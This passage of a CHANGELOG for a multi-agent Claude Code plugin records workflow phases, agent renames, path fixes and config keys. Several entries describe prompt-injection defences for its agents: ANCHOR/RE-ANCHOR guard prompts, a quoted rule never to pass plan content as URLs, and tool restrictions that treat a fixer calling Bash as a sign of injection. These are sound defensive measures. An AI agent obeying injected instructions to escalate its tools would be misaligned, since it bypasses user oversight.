- work.md: Phase 0 PLAN CLARIFICATION — ambiguity detection sub-step after task extraction. Flags vague descriptions, missing dependencies, unclear scope. AskUserQuestion with clarify-now vs proceed-as-is options.
- work.md: Phase 4 POST-WARD VERIFICATION CHECKLIST — deterministic checks at zero LLM cost: incomplete tasks, unchecked plan items, blocked tasks, uncommitted patches, merge conflict markers, dirty working tree.
- work.md: Phase 6.5 SHIP — optional PR creation after cleanup. Pre-checks `gh` CLI availability and auth. PR body generated from plan context (diff stats, task list, ward results) and written to file (shell injection prevention). Talisman-configurable monitoring section and co-authors.
- work.md: ENHANCED COMPLETION REPORT — includes branch name, duration, artifact paths. Smart review recommendation heuristic (security files → recommended, large changeset → recommended, config files → suggested, small → optional). Interactive AskUserQuestion next steps.
- work.md: KEY PRINCIPLES section — orchestrator guidelines (ship complete, fail fast on ambiguity, branch safety, serialize git) and worker guidelines (match patterns, test as you go, one task one patch, don't over-engineer, exit cleanly).
- work.md: COMMON PITFALLS table — 9 pitfalls with prevention strategies.
- talisman.example.yml: 6 new keys under `work:` — `skip_branch_check`, `branch_prefix`, `pr_monitoring`, `pr_template`, `auto_push`, `co_authors`.
- Updated Pipeline Overview diagram to show all phases including 0.5, 3.5, 6, and 6.5.

### Changed

- work.md: Pipeline Overview expanded from 7 to 10 phases (including sub-phases 0.5, 3.5, 6.5)
- plugin.json: version 1.11.0 → 1.12.0

### Migration Notes

- **No breaking changes** — all new features are opt-in
- Users on default branch will see new branch creation prompt (disable via `work.skip_branch_check: true`)
- PR creation requires GitHub CLI (`gh`) authentication — install: https://cli.github.com/

## [1.11.0] - 2026-02-13

Feature release: Arc pipeline expanded from 6 to 8 phases with plan refinement, verification gate, per-phase time budgets, and checkpoint schema v2.

### Added

- arc.md: Phase 2.5 PLAN REFINEMENT — orchestrator-only concern extraction from CONCERN verdicts into `concern-context.md` for worker awareness. All-CONCERN escalation via AskUserQuestion
- arc.md: Phase 2.7 VERIFICATION GATE — deterministic zero-LLM checks (file references, heading links, acceptance criteria, TODO/FIXME, talisman patterns). Git history annotation for stale file references
- arc.md: `PHASE_ORDER` constant — canonical 8-element array for resume validation by name, not sequence numbers
- arc.md: `PHASE_TIMEOUTS` — per-phase hardcoded time budgets (delegated phases use inner-timeout + 60s buffer). `ARC_TOTAL_TIMEOUT` (90 min, later increased to 120 min in v1.17.0) and `STALE_THRESHOLD` (5 min)
- arc.md: Checkpoint schema v2 — adds `schema_version: 2`, `plan_refine` and `verification` phase entries
- arc.md: Backward-compatible checkpoint migration — auto-upgrades v1 checkpoints on read (inserts new phases as "skipped")
- arc.md: Timeout monitoring in Phase 1 (FORGE) and Phase 2 (PLAN REVIEW) polling loops with completion-before-timeout check, stale detection, and final sweep
- arc.md: `parseVerdict()` function with anchored regex for structured verdict extraction
- arc.md: Concern context propagation — Phase 5 (WORK) worker prompts include concern-context.md when available
- cancel-arc.md: Added `plan_refine` and `verification` to legacy team name map (both null — orchestrator-only)
- cancel-arc.md: Null-team guard — orchestrator-only phases skip team cancellation (Steps 3a-3d)
- cancel-arc.md: Updated cancellation table and report template to 8 phases
- talisman.example.yml: Commented-out `arc.timeouts` section documenting per-phase defaults (for v1.12.0+)

### Changed

- arc.md: Renumbered phases — WORK (3→5), CODE REVIEW (4→6), MEND (5→7), AUDIT (6→8)
- arc.md: Updated all tables (Phase Transition Contracts, Tool Restrictions, Failure Policy, Completion Report, Error Handling)
- arc.md: `--approve` flag documentation updated "Phase 3 only" → "Phase 5 only"
- arc.md: Branch strategy updated "Before Phase 3" → "Before Phase 5"
- work.md: Updated arc cross-references — Phase 3 → Phase 5, Phase 5 → Phase 7
- CLAUDE.md: Arc pipeline description updated to 8 phases with plan refinement and verification
- CLAUDE.md: Arc artifact list updated with `concern-context.md` and `verification-report.md`
- README.md: Arc phase list expanded to 8 phases with Phase 2.5 and 2.7
- README.md: "6 phases" → "8 phases" in Key Concepts
- Root README.md: Pipeline diagram and command table updated for 8-phase arc
- team-lifecycle-guard.md: Updated arc phase rows for Phases 2.5/2.7 (orchestrator-only) and 5-8 (delegated)

## [1.10.6] - 2026-02-13

Documentation normalization: Replace tiered agent rules (1-2/3-4/5+ tiers) with a single rule — all Rune multi-agent workflows use Agent Teams. Custom (non-Rune) workflows retain the 3+ agent threshold for Agent Teams requirement. Codifies what every command has done since v0.1.0 and eliminates a persistent design-vs-implementation gap across framework documentation.

### Changed

- CLAUDE.md: Replaced 3-row tiered Multi-Agent Rules table with single-row "All Rune multi-agent workflows" rule
- context-weaving/SKILL.md: Updated "When to Use" table — removed 3-4/5+ agent tiers, unified to "Any Rune command"
- context-weaving/SKILL.md: Simplified Thought 2 strategy block from 3 tiers to 2 lines (Rune + custom)
- overflow-wards.md: Simplified ASCII decision tree from 3 branches to 2 (Rune command + custom workflow)
- rune-orchestration/SKILL.md: Removed dead `Task x 1-2` branch from inscription protocol rule
- inscription-protocol.md: Updated coverage matrix — removed "Single agent / Glyph Budget only" row, added `/rune:mend`
- inscription-protocol.md: Removed conditional '(when 3+)' qualifier from `/rune:strive` inscription requirement — inscription now unconditional for all Rune workflows
- inscription-protocol.md: Updated Step 4 verification table — all sizes use Agent Teams, verification scales with team size
- structured-reasoning.md: Updated Thought 2 from "Task-only, Agent Teams, or hybrid?" to deterministic Agent Teams rule
- task-templates.md: Added "Platform reference" note to Task Subagent template — Rune commands use Background Teammate

## [1.10.5] - 2026-02-13

Feature release: Structured review checklists for all 10 review agents. Each agent now has a `## Review Checklist` section with 3 subsections — agent-specific Analysis Todo, shared Self-Review quality gate, and shared Pre-Flight output gate. Improves review consistency and completeness.

### Added

- ward-sentinel.md: 10-item Analysis Todo (injection, auth, secrets, input validation, CSRF, agent injection, crypto, error responses, CORS, CVEs)
- flaw-hunter.md: 8-item Analysis Todo (nullable returns, empty collections, off-by-one, race conditions, silent failures, exhaustive handling, TOCTOU, missing await)
- pattern-seer.md: 7-item Analysis Todo (naming conventions, file organization, error handling, imports, service naming, API format, config patterns)
- simplicity-warden.md: 7-item Analysis Todo (single-impl abstractions, unnecessary factories, one-use helpers, speculative config, indirection, over-parameterization, justified abstractions)
- ember-oracle.md: 8-item Analysis Todo (N+1 queries, O(n²) algorithms, sequential awaits, blocking calls, pagination, memory allocation, caching, missing indexes)
- rune-architect.md: 7-item Analysis Todo (layer boundaries, dependency direction, circular deps, SRP, service boundaries, god objects, interface segregation)
- mimic-detector.md: 6-item Analysis Todo (identical logic, duplicated validation, repeated error handling, copy-pasted test setup, near-duplicates, intentional similarity)
- wraith-finder.md: 6-item Analysis Todo (unused functions, unreachable code, commented blocks, unused imports, orphaned files, phantom-checker cross-check)
- void-analyzer.md: 6-item Analysis Todo (TODO markers, stubs, missing error handling, placeholders, partial implementations, docstring promises)
- phantom-checker.md: 6-item Analysis Todo (string-based refs, framework registration, plugin systems, re-exports, partial matches, config references)
- All 10 agents: Shared Self-Review subsection (5 evidence/quality checks)
- All 10 agents: Shared Pre-Flight subsection (5 output format checks with agent-specific finding prefixes; phantom-checker uses variant Pre-Flight with categorization-based output)

### Fixed

- mend.md: Added SAFE_WARD regex validation to Phase 5 ward check (consistency with work.md SEC-012 fix)
- mend.md: Moved identifier validation before state file write in Phase 2 (BACK-013 validation ordering)
- mend.md: Added validation comment to Phase 6 cleanup rm -rf (SEC-014)
- work.md: Added validation comment to Phase 6 cleanup rm -rf (SEC-013)
- README.md: Updated version from 1.10.4 to 1.10.5 in plugins table (DOC-014 version drift)

## [1.10.4] - 2026-02-13

Patch release: codex-cli audit hardening — 7 active findings + 3 already-fixed (forge-enriched), plus 7 deep-dive findings (logic conflicts, documentation drift, design inconsistencies). All changes are markdown command specifications only.

### Added

- review.md: Unified scope builder — default mode now includes committed + staged + unstaged + untracked files (was committed-only). Displays scope breakdown summary.
- review.md, audit.md, work.md: Named timeout constants (POLL_INTERVAL, STALE_THRESHOLD, TOTAL_TIMEOUT) with hard timeout and final sweep in all monitor loops
- work.md: Commit broker — workers write patches to `tmp/work/{timestamp}/patches/`, orchestrator applies and commits via single-writer pattern (eliminates `git/index.lock` contention)
- work.md: `inscription.json` generation (was missing — 3/4 commands had it)
- work.md: Output directory creation (`tmp/work/{timestamp}/patches/` and `tmp/work/{timestamp}/proposals/`)
- mend.md: Worktree-based bisection — user's working tree is NEVER modified during bisection. Stash-based fallback with user confirmation if worktree unavailable.
- cancel-review.md, cancel-audit.md: Multi-session disambiguation via AskUserQuestion when multiple active sessions exist (previously auto-selected most recent)
- cancel-review.md, cancel-audit.md: `AskUserQuestion` added to `allowed-tools` frontmatter
- plan.md: Generic verification gate — reads patterns from `talisman.yml` `plan.verification_patterns` instead of hardcoded repo-specific checks
- plan.md: `inscription.json` generation in Phase 1A (was missing — review/audit/work had it)
- forge.md: `inscription.json` generation in Phase 4 (was missing — only review/audit/work had it)
- talisman.example.yml: `plan.verification_patterns` schema for custom verification patterns
- rest.md: Git worktree cleanup for stale bisection worktrees (`git worktree prune`)
- rest.md: Arc active-state check via `.claude/arc/*/checkpoint.json` — preserves `tmp/arc/` directories for in-progress arc sessions
- review.md, audit.md: Design note in Phase 3 explaining why Ashes are summoned as `general-purpose` (composite prompt pattern, defense-in-depth tool restriction)
- ash-guide SKILL.md: Two invocation models documented — Direct (namespace prefix) vs Composite Ash (review/audit workflows)

### Fixed

- review.md: Scope blindness — default mode missed staged, unstaged, and untracked files. Now captures all local file states.
- work.md: Commit race condition — parallel workers competing for `.git/index.lock`. Commit broker serializes only the fast commit step.
- work.md: `--approve` flow path mismatch — `proposals/` directory never created but referenced by workers. Added to `mkdir -p`.
- work.md: Mixed `{id}`/`{timestamp}` variables in `--approve` flow — unified to `{timestamp}` (4 occurrences)
- review.md, audit.md, work.md: Unbounded monitor loops — no hard timeout. Added 10/15/30 min limits respectively.
- mend.md: Destructive bisection rollback — `git checkout -- .` could destroy unrelated working tree changes. Worktree isolation eliminates this risk.
- rest.md: False claim that `tmp/arc/` follows same active-state check as reviews/audits — arc uses checkpoint.json, not state files. Now correctly checks `.claude/arc/*/checkpoint.json` for in-progress status.
- rest.md: `tmp/arc/` moved from unconditional removal to conditional block (patterned after `tmp/work/` block)
- CLAUDE.md: Multi-Agent Rules table row 2 now matches canonical rule — "3+ agents OR any TeamCreate" (was "3-4 agents")
- rune-orchestration SKILL.md: Research path corrected from `tmp/research/` to `tmp/plans/{timestamp}/research/` (matching actual plan.md output)
- roundtable-circle SKILL.md: Phase 0 pre-flight updated from stale `HEAD~1..HEAD` to unified scope builder (committed + staged + unstaged + untracked)
- roundtable-circle SKILL.md: `completion.json` removed from output directory tree and schema section converted to Legacy note (never implemented — Seal + state files serve same purpose)

## [1.10.3] - 2026-02-13

Patch release: security hardening, path consistency, and race condition fix from codex-cli deep verification. Includes review-round fixes from Roundtable Circle review (PR #12).

### Security

- **P1** mend.md: Fixers now summoned with `subagent_type: "rune:utility:mend-fixer"` instead of `"general-purpose"` to enforce restricted tool set via agent frontmatter (prevents prompt injection escalation to Bash)

### Added

- rune-gaze.md: New `INFRA_EXTENSIONS` group (Dockerfile, .sh, .sql, .tf, CI/CD configs) → Forge Warden. Previously these fell through all classification groups and got no type-specific Ash.
- rune-gaze.md: New `CONFIG_EXTENSIONS` group (.yml, .yaml, .json, .toml, .ini) → Forge Warden. Config files were previously unclassified.
- rune-gaze.md: New `INFRA_FILENAMES` list for extensionless files (Dockerfile, Makefile, Procfile, Vagrantfile, etc.)
- rune-gaze.md: Catch-all classification — unclassified files that aren't in skip list default to Forge Warden instead of silently falling through
- rune-gaze.md: `.claude/` path escalation — `.claude/**/*.md` files now trigger both Knowledge Keeper (docs) AND Ward Sentinel (security boundary) with explicit context
- rune-gaze.md: Docs-only override — when ALL non-skip files are doc-extension and fall below the line threshold, promote them so Knowledge Keeper is still summoned
- rune-gaze.md: `doc_line_threshold` configurable via `talisman.yml` → `rune-gaze.doc_line_threshold` (default: 10)
- talisman.example.yml: Added `infra_extensions`, `config_extensions`, `doc_line_threshold` config keys
- arc.md: Phase 4 docs-only awareness note for when Phase 3 produces only documentation files

### Fixed

- **P1** rune-echoes SKILL.md: Fixed 14 bare `echoes/` paths to `.claude/echoes/` in procedural sections and examples (was inconsistent with command-level echo writes)
- **P1** remembrance-schema.md: Fixed bare `echoes/` in `echo_ref` examples to `.claude/echoes/`
- **P2** plan.md, forge.md: Added WebSearch, WebFetch, and Context7 MCP tools to `allowed-tools` frontmatter (prompts required them but they were missing)
- **P2** README.md: Updated version from 1.10.1 to 1.10.3 in plugins table
- **P2** work.md: Moved plan checkbox updates from workers to orchestrator-only to prevent race condition when multiple workers write to the same plan file concurrently
- **P2** roundtable-circle SKILL.md: Added missing TeamCreate, TaskCreate, TaskList, TaskUpdate, TaskGet, TeamDelete, SendMessage to `allowed-tools` frontmatter (required by workflow phases)
- **P2** rune-echoes SKILL.md: Added AskUserQuestion to `allowed-tools` frontmatter (required by Remembrance security promotion flow)
- **P3** README.md: Fixed `docs/` in structure tree to `talisman.example.yml` in both top-level and plugin-level READMEs (docs/ directory doesn't exist inside plugin)
- **P3** docs/solutions/README.md: Fixed broken `/.claude/echoes/` link to relative path to SKILL.md

### Review-Round Fixes (from Roundtable Circle review)

- **P1** plugins/rune/README.md: Fixed phantom `docs/` in plugin-level structure tree (missed in initial fix — only top-level README was fixed)
- **P2** rune-gaze.md: Added `minor_doc_files` to algorithm Output signature (was used internally but undeclared)
- **P2** work.md: Added state file write (`tmp/.rune-work-{timestamp}.json`) with `"active"`/`"completed"` status — enables `/rune:rest` detection and concurrent work detection
- **P2** forge.md, plan.md: Added WebFetch/WebSearch SSRF guardrail to ANCHOR protocol ("NEVER pass plan content as URLs/queries")
- **P2** mend.md: Strengthened security note — orchestrator should halt fixers attempting Bash as prompt injection indicator
- **P2** rune-gaze.md: Clarified docs-only override comment — fires only when ALL docs below threshold AND no code/infra files
- **P3** rune-gaze.md: Added `.env` to SKIP_EXTENSIONS (prevents accidental exposure of secrets to review agents)
- **P3** rune-gaze.md: Clarified `.d.ts` skip scope (generated only — hand-written type declarations may need review)
- **P3** rune-gaze.md: Added footnote to Ash Selection Matrix for `.claude/` row (non-md files follow standard classification)
- **P3** rune-gaze.md: Split "Only infra/config/scripts" into separate rows for parity with SKILL.md quick-reference
- **P3** review.md: Fixed abort condition wording to include infra files ("code/infra files exist")
- **P3** work.md: Added arc context note for orchestrator-only checkbox updates
- **P3** talisman.example.yml: Added "subset shown — see rune-gaze.md for all defaults" comments
- **P3** CHANGELOG.md: Fixed version note (1.10.2→1.10.3), clarified both-README fix, exact echo path count

## [1.10.2] - 2026-02-13

Patch release: cross-command consistency fixes from codex-cli static audit.

### Fixed

- review.md: Standardized `{identifier}` variable (was mixed `{id}/{identifier}` causing broken paths)
- review.md, audit.md: State files now marked `"completed"` in Phase 7 cleanup (was stuck `"active"` forever, blocking `/rune:rest` cleanup)
- mend.md: Status field standardized to `"active"` (was `"running"`, mismatched with rest.md's expected value)
- mend.md: Standardized `{id}` variable (was mixed `{id}/{timestamp}`) and fixed undefined `f` variable in task description template
- forge.md: Added `mkdir -p` before `cp` backup command (was failing if directory didn't exist)
- forge.md, plan.md: Normalized reference paths from `skills/roundtable-circle/...` to `roundtable-circle/...` (consistent with all other files)
- arc.md: Made plan path optional with `--resume` (auto-detected from checkpoint); fixed contradictory recovery instructions
- arc.md: Added `team_name` field to per-phase checkpoint schema (enables cancel-arc to find delegated team names)
- cancel-arc.md: Now reads `team_name` from checkpoint instead of hardcoded phase-to-team map (was using wrong names for delegated Phases 3-6)
- cancel-arc.md: Fixed undefined `member` variable in shutdown loop (now reads team config to discover teammates)
- plan.md, review.md, audit.md, mend.md, work.md: Fixed echo write paths from `echoes/` to `.claude/echoes/` (was writing to wrong location)
- rest.md: Deletion step now uses validated path list from Step 4 (was ignoring validation output)

## [1.10.1] - 2026-02-13

Patch release: forge enrichment improvements and review finding fixes.

### Added

- Plan backup before forge merge — enables diff viewing and revert
- Enrichment Output Format template — standardized subsections (Best Practices, Performance, Implementation Details, Edge Cases, References)
- Post-enhancement options — diff, revert, deepen specific sections
- Echo integration in forge agent prompts — agents read `.claude/echoes/` for past learnings
- Context7 MCP + WebSearch explicit in forge agent research steps

### Fixed

- forge.md agent prompts now include anti-injection guard (Truthbinding parity with plan.md)
- forge.md Phase 6 `rm -rf` now has adjacent regex guard (SEC-1)
- forge.md RE-ANCHOR wording fixed for runtime-read plan content (SEC-2)
- forge.md `planPath` validated before Bash calls (SEC-3)
- arc.md YAML examples corrected from `docs/plans/` to `plans/` (DOC-1)
- arc.md `plan_file` path validation added before checkpoint (SEC-4)
- arc.md internal `skip_forge` key renamed to `no_forge` (QUAL-1)
- plan.md added missing `Load skills` directive (`rune-orchestration`) and `Edit` tool
- review.md, audit.md, work.md, mend.md added missing `Load skills` directives (`context-weaving`, `rune-echoes`, `rune-orchestration`)
- Pseudocode template syntax normalized to `{placeholder}` style across commands
- arc.md `rm -rf` sites annotated with validation cross-reference comments (SEC-5)

### Removed

- `docs/specflow-findings.md` — tracking document superseded by CHANGELOG and GitHub Issues

## [1.10.0] - 2026-02-12 — "The Elden Throne"

### Added

- `/rune:forge` — standalone plan enrichment command (deepen any existing plan with Forge Gaze)
- `--quick` flag for `/rune:devise` — minimal pipeline (research + synthesize + review)
- Phase 1.5: Research Consolidation Validation checkpoint (AskUserQuestion after research)
- Phase 2.5: Shatter Assessment for complex plan decomposition (complexity scoring + shard generation)
- AI-Era Considerations section in Comprehensive template
- SpecFlow dual-pass for Comprehensive plans (second flow-seer pass on drafted plan)
- Post-plan "Open in editor" and "Review and refine" options (4 explicit + Other free-text)
- Automated grep verification gate in plan review phase (deterministic, zero hallucination risk)
- decree-arbiter 6th dimension: Internal Consistency (anti-hallucination checks)

### Changed

- **Brainstorm + forge now default** — `/rune:devise` runs full pipeline by default. Use `--quick` for minimal.
- `--skip-forge` renamed to `--no-forge` in `/rune:arc` for consistency
- `--no-brainstorm`, `--no-forge`, `--exhaustive` still work as legacy flags
- Post-plan options expanded (4 explicit + Other free-text)
- decree-arbiter now evaluates 6 dimensions (was 5)
- **Elden Lord → Tarnished** — The lead/orchestrator is now called "the Tarnished" (the protagonist).
  In Elden Ring, the Tarnished is the player character who journeys through the Lands Between.
- **Tarnished → Ash** — All teammates (review, work, research, utility) are now called "Ash" / "Ashes".
  In Elden Ring, Spirit Ashes are summoned allies. "The Tarnished summons Ashes" — lore-accurate.
- **Config keys renamed**: `tarnished:` → `ashes:`, `max_tarnished` → `max_ashes`,
  `disable_tarnished` → `disable_ashes`. Update your `.claude/talisman.yml`.
- Directory renames: `tarnished-prompts/` → `ash-prompts/`,
  `tarnished-guide/` → `ash-guide/`, `custom-tarnished.md` → `custom-ashes.md`
- **Elden Throne completion message** — Successful workflow completion now shows
  "The Tarnished has claimed the Elden Throne." in arc and work outputs.
- Lore Glossary updated: Tarnished = lead, Ash = teammates, Elden Throne = completion state.

### Unchanged (Intentional)

- `recipient: "team-lead"` in all SendMessage calls — platform identifier
- Named roles: Forge Warden, Ward Sentinel, Pattern Weaver, Glyph Scribe, Knowledge Keeper
- `summon` verb — already lore-accurate (Tarnished summons Ashes)
- `talisman.yml` config file name — unchanged
- All logic, phases, and orchestration patterns

## [1.9.0] - 2026-02-12 — "The Elden Lord"

### Added

- **Elden Lord persona** — The orchestrator/lead now has a named identity. All commands use
  lore-themed greeting messages ("The Elden Lord convenes the Roundtable Circle...").
- **Lore Glossary** — New reference table in CLAUDE.md mapping 18 Elden Ring terms to plugin concepts.
- **Forge Gaze** — Topic-aware agent selection for `/rune:devise --forge`. Matches plan section
  topics to specialized agents using keyword overlap scoring (deterministic, zero token cost).
  13 agents across 2 budget tiers replace generic `forge-researcher` agents.
  See `roundtable-circle/references/forge-gaze.md` for the topic registry and algorithm.
- **Forge Gaze configuration** — Override thresholds, per-section caps, and total agent limits
  via `forge:` section in `talisman.yml`. Custom Tarnished participate via `workflows: [forge]`.

### Changed

- **Runebearer → Tarnished** — All review/worker/research/utility teammates are now called
  "Tarnished". Named roles (Forge Warden, Ward Sentinel, etc.) are unchanged.
- **Config keys renamed**: `runebearers:` → `tarnished:`, `max_runebearers` → `max_tarnished`,
  `disable_runebearers` → `disable_tarnished`. Update your `.claude/talisman.yml`.
- Directory renames: `runebearer-prompts/` → `tarnished-prompts/`,
  `runebearer-guide/` → `tarnished-guide/`, `custom-runebearers.md` → `custom-tarnished.md`
- **Config file renamed**: `rune-config.yml` → `talisman.yml`, `rune-config.example.yml` → `talisman.example.yml`.
  Talismans in Elden Ring are equippable items that enhance abilities — fitting for plugin configuration.
- **spawn → summon** — All 182 references to "spawn" renamed to "summon" across 37 files.
  In Elden Ring, you summon spirits and cooperators to aid in battle.
- Natural-language "the lead" → "the Elden Lord" across commands, prompts, and skills.

### Unchanged (Intentional)

- `recipient: "team-lead"` in all SendMessage calls — platform identifier
- Named roles: Forge Warden, Ward Sentinel, Pattern Weaver, Glyph Scribe, Knowledge Keeper
- All logic, phases, and orchestration patterns

## [1.8.2] - 2026-02-12

### Added

- Remembrance directory structure — `docs/solutions/` with 8 category directories and README

### Fixed

- SpecFlow findings updated through v1.8.1 (was stuck at v1.2.0) — added 20 resolved entries
- Stale `codex-scholar` references in plan document updated to `lore-scholar`

## [1.8.1] - 2026-02-12

### Changed

- **Agent rename**: `codex-scholar` → `lore-scholar` — avoids name collision with OpenAI's codex-cli. "Lore" fits the Elden Ring theme and conveys documentation research. Updated across 7 files (agent definition, commands, skills, CLAUDE.md, README, CHANGELOG).

## [1.8.0] - 2026-02-12 — "Knowledge & Safety"

### Added

- Remembrance channel — Human-readable knowledge docs in `docs/solutions/` promoted from Rune Echoes
- `--approve` flag for `/rune:strive` — Optional plan approval gate per task
- `--exhaustive` flag for `/rune:devise --forge` — Summon ALL agents per section
- E8 research pipeline upgrade — Conditional research, brainstorm auto-detect, 6-agent roster, plan detail levels
- `/rune:echoes migrate` — Echo name migration utility
- `/rune:echoes promote` — Promote echoes to Remembrance docs

### Changed

- `/rune:devise` research now uses conditional summoning (local-first, external on demand)
- `/rune:devise` post-generation options expanded to 6 (was 3)
- Team lifecycle guards added to all 9 commands — pre-create guards + cleanup fallbacks with input validation (see `team-lifecycle-guard.md`)
- Reduced allowed-tools for `/rune:echoes`, `/rune:rest`, `/rune:cancel-arc` to enforce least-privilege

## [1.7.0] - 2026-02-12 — "Arc Pipeline"

### Added

- `/rune:arc` — End-to-end orchestration pipeline (6 phases: forge → plan review → work → code review → mend → audit)
- `/rune:cancel-arc` — Cancel active arc pipeline
- `--forge` flag for `/rune:devise` — Research enrichment phase (replaces `--deep`)
- `knowledge-keeper` standalone agent — Documentation coverage reviewer for arc Phase 2
- Checkpoint-based resume (`--resume`) with artifact integrity validation (SHA-256)
- Per-phase tool restrictions for arc pipeline (least-privilege enforcement)
- Feature branch auto-creation (`rune/arc-{name}-{date}`) when on main

## [1.6.0] - 2026-02-12 — "Mend & Commit"

### Added

- `/rune:mend` — Parallel finding resolution from TOME with team member fixers
- `mend-fixer` agent — Restricted-tool code fixer with full Truthbinding Protocol
- Incremental commits (E5) — Auto-commit after each ward-checked task (`rune: <subject> [ward-checked]`)
- Plan checkbox updates — Auto-mark completed tasks in plan file
- Resolution report format with FIXED/FALSE_POSITIVE/FAILED/SKIPPED categories

### Security

- SEC-prefix findings require human approval for FALSE_POSITIVE marking
- Mend fixers have restricted tool set (no Bash, no TeamCreate)
- Commit messages sanitized via `git commit -F` (not inline `-m`)
- `[ward-checked]` tag correctly implies automated check, not human verification

## [1.5.0] - 2026-02-12

### Added

- **Decree Arbiter** utility agent — technical soundness review for plans with 5-dimension evaluation (feasibility, risk, efficiency, coverage, consistency), Decree Trace evidence format, and deterministic verdict markers
- **Remembrance Channel** — human-readable knowledge documents in `docs/solutions/` promoted from high-confidence Rune Echoes, with YAML frontmatter schema, 8 categories, and security gate requiring human verification
- **TOME structured markers** — `<!-- RUNE:FINDING nonce="{session_nonce}" id="..." file="..." line="..." severity="..." -->` for machine-parseable review findings

### Changed

- **Naming refresh** — selective rename of agents, commands, and skills for clarity:
  - Review agents: `echo-detector` → `mimic-detector`, `orphan-finder` → `wraith-finder`, `forge-oracle` → `ember-oracle`
  - Research agents: `lore-seeker` → `practice-seeker`, `realm-analyst` → `repo-surveyor`, `chronicle-miner` → `git-miner`
  - Tarnished: `Lore Keeper` → `Knowledge Keeper`
  - Command: `/rune:cleanup` → `/rune:rest`
  - Skill: `rune-circle` → `roundtable-circle`
- All internal cross-references updated across 30+ files

### Removed

- Deprecated alias files (`cleanup.md`, `lore-keeper.md`) — direct rename, no backward-compat aliases

## [1.4.2] - 2026-02-12

### Added

- **Truthbinding Protocol** for all 10 review agents — ANCHOR + RE-ANCHOR prompt injection resistance
- **Truthbinding hardening** for utility agents (runebinder, truthseer-validator) and Tarnished prompts (forge-warden, pattern-weaver, glyph-scribe, lore-keeper)
- **File scope restrictions** for work agents (rune-smith, trial-forger) — prevent modification of `.claude/`, `.github/`, CI/CD configs
- **File scope restrictions** for utility agents (scroll-reviewer, flow-seer) — context budget and scope boundaries
- **New reference files** — `rune-orchestration/references/output-formats.md` and `rune-orchestration/references/role-patterns.md` (extracted from oversized SKILL.md)

### Fixed

- **P1: Missing `Write` tool** in `cancel-review` and `cancel-audit` commands — state file updates would fail at runtime
- **P1: Missing `TaskGet` tool** in `review` and `audit` commands — task inspection during monitoring unavailable
- **P1: Missing `Edit` tool** in `echoes` command — prune subcommand could not edit memory files
- **P1: Missing `AskUserQuestion` tool** in `cleanup` command — user confirmation dialog unavailable
- **P1: Missing `allowed-tools`** in `tarnished-guide` skill — added Read, Glob
- **P1: `rune-orchestration` SKILL.md** exceeded 500-line guideline (437 lines) — reduced to 245 lines via reference extraction
- **Glyph Scribe / Lore Keeper documentation** — clarified these use inline perspectives, not dedicated agent files
- **Agent-to-Tarnished mapping** made explicit across tarnished-guide, CLAUDE.md, circle-registry
- **Skill descriptions** rewritten to third-person trigger format per Anthropic SKILL.md standard
- **`--max-agents` default** in audit command corrected from `5` to `All selected`
- **Malicious code warnings** added to RE-ANCHOR sections in all 4 Tarnished prompts
- **Table of Contents** added to `custom-tarnished.md` reference
- **`rune-gaze.md`** updated max Tarnished count to include custom Tarnished (8 via settings)
- **echo-reader** listing fixed in v1.0.0 changelog entry

## [1.4.1] - 2026-02-12

### Fixed

- **Finding prefix naming** — unified all files to canonical prefixes (BACK/QUAL/FRONT) replacing stale FORGE/PAT/GLYPH references across 9 files
- **Root README** — removed phantom `plugin.json` from structure diagram (only `marketplace.json` exists at root)
- **Missing agent definition** — added `agents/utility/truthseer-validator.md` (referenced in CLAUDE.md but file was absent)
- **Agent name validation** — added path traversal prevention rule (`^[a-zA-Z0-9_:-]+$`) to custom Tarnished validation
- **Cleanup symlink safety** — added explicit symlink detection (`-L` check) before path validation in cleanup command
- **specflow-findings.md** — moved item #7 (Custom agent templates) to Resolved table (delivered in v1.4.0)
- **Keyword alignment** — synced `plugin.json` keywords with `marketplace.json` tags (`swarm`, `planning`)
- **`--max-agents` flag** — added to `/rune:appraise` command (was only documented for `/rune:audit`)

## [1.4.0] - 2026-02-12

### Added

- **Custom Tarnished** — extend built-in 5 Tarnished with agents from local (`.claude/agents/`), global (`~/.claude/agents/`), or third-party plugins via `talisman.yml`
  - `tarnished.custom[]` config with name, agent, source, workflows, trigger, context_budget, finding_prefix
  - Truthbinding wrapper prompt auto-injected for custom agents (ANCHOR + Glyph Budget + Seal + RE-ANCHOR)
  - Trigger matching: extension + path filters with min_files threshold
  - Agent resolution: local → global → plugin namespace
- **`talisman.example.yml`** — complete example config at plugin root
- **`custom-tarnished.md`** — full schema reference, wrapper prompt template, validation rules, examples
- **Extended dedup hierarchy** — `settings.dedup_hierarchy` supports custom finding prefixes alongside built-ins
- **`settings.max_tarnished`** — configurable hard cap (default 8) for total active Tarnished
- **`defaults.disable_tarnished`** — optionally disable built-in Tarnished
- **`--dry-run` output** now shows custom Tarnished with their prefix, file count, and source

### Changed

- `/rune:appraise` and `/rune:audit` Phase 0 now reads `talisman.yml` for custom Tarnished definitions
- Phase 3 summoning extended to include custom Tarnished with wrapper prompts
- Runebinder aggregation uses extended dedup hierarchy from config
- `--max-agents` flag range updated from 1-5 to 1-8 (to include custom)

## [1.3.0] - 2026-02-12

### Enhanced

- **Truthsight Verifier prompt** — added 3 missing verification tasks from source architecture:
  - Task 1: Rune Trace Resolvability Scan (validates all evidence blocks are resolvable)
  - Task 4: Cross-Tarnished Conflict Detection (flags conflicting assessments + groupthink)
  - Task 5: Self-Review Log Validation (verifies log completeness + DELETED consistency)
- **Truthsight Verifier prompt** — added Context Budget (100k token breakdown), Read Constraints (allowed vs prohibited reads), Seal Format for verifier output, Re-Verify Agent Specification (max 2, 3-min timeout), Timeout Recovery (15-min with partial output handling)
- **Structured Reasoning** — added foundational "5 Principles" framework (Forced Serialization, Revision Permission, Branching, Dynamic Scope, State Externalization) with per-level application tables
- **Structured Reasoning** — added "Why Linear Processes Degrade" motivation section, Decision Complexity Matrix, Fallback Behavior (when Sequential Thinking MCP unavailable), Token Budget specification, expanded Self-Calibration Signals and Scope Rules
- **Inscription Protocol** — expanded "Adding Inscription to a New Workflow" into full Custom Workflow Cookbook with step-by-step template, inscription.json example, verification level guide, and research workflow example

### Gap Analysis Reference

Based on comprehensive comparison of source `multi-agent-patterns` (6 files, ~2,750 lines) against Rune plugin equivalents (6 files, ~1,811 lines → now ~1,994 lines). All gaps identified in the P1-P3 priority analysis have been resolved.

## [1.2.0] - 2026-02-12

### Added

- `/rune:cleanup` command — remove `tmp/` artifacts from completed workflows, with `--dry-run` and `--all` flags
- `--dry-run` flag for `/rune:appraise` and `/rune:audit` — preview scope selection without summoning agents
